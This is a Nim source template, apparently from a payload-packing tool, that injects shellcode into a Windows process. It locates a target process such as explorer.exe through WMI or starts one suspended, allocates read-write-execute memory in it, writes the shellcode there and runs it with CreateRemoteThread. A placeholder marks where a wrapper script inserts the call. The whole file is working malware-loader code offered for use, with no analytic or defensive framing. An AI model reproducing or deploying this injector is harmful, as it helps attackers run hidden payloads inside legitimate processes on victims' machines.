    #[ 
        NimPackt-Template-Shinject.nim starts here
    ]#

    import osproc
    import winim/lean
    import winim/com
    from bitops import bitor

    proc injectShellcodeRemote(shellcode: openArray[byte], tprocessName: string, injectExistingProcess: bool): void =

        var tProcessId : DWORD

        if injectExistingProcess == true:
            if verbose:
                echo "[*] Injecting in existing process..."
            
            let wmi = GetObject(r"winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")

            for process in wmi.execQuery("SELECT * FROM win32_process"):
                if process.name == tProcessName:
                    tProcessId = process.handle

        else:
            if verbose:
                echo "[*] Injecting in new process..."

            let tProcess = startProcess(tProcessName)
            tProcess.suspend() 
            defer: tProcess.close()
            tProcessId = cast[DWORD](tProcess.processID)

        if verbose:
            echo "[*] Target Process: ", tProcessName, " [", tProcessId, "]"

        let pHandle = OpenProcess(
            PROCESS_ALL_ACCESS, 
            false, 
            tProcessId
        )
        defer: CloseHandle(pHandle)

        if verbose:
            echo "[*] pHandle: ", pHandle

        var commitMem : DWORD

        if injectExistingProcess == true:
            commitMem = bitor(MEM_COMMIT, MEM_RESERVE)
        else:
            commitMem = MEM_COMMIT

        let rPtr = VirtualAllocEx(
            pHandle,
            NULL,
            cast[SIZE_T](shellcode.len),
            commitMem,
            PAGE_EXECUTE_READ_WRITE
        )

        var bytesWritten: SIZE_T
        let wSuccess = WriteProcessMemory(
            pHandle, 
            rPtr,
            unsafeAddr shellcode,
            cast[SIZE_T](shellcode.len),
            addr bytesWritten
        )

        if verbose:
            echo "[*] WriteProcessMemory: ", bool(wSuccess)
            echo "    \\-- bytes written: ", bytesWritten
            echo ""

        var tHandle : HANDLE

        if injectExistingProcess == true:
            tHandle = CreateRemoteThread(
                pHandle, 
                NULL,
                0,
                cast[LPTHREAD_START_ROUTINE](rPtr),
                NULL, 
                NULL, 
                NULL
            )
            defer: CloseHandle(tHandle)
        else:
            tHandle = CreateRemoteThread(
                pHandle, 
                NULL,
                0,
                cast[LPTHREAD_START_ROUTINE](rPtr),
                NULL, 
                0, 
                NULL
            )
            defer: CloseHandle(tHandle)

        if verbose:
            echo "[*] tHandle: ", tHandle
            echo "[+] Injected"

    if verbose:
        echo "[*] Executing shellcode in remote thread..."

    # BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: injectShellcodeRemote(decodedPay, "explorer.exe", true)
    #[ PLACEHOLDERINJECTCALL ]#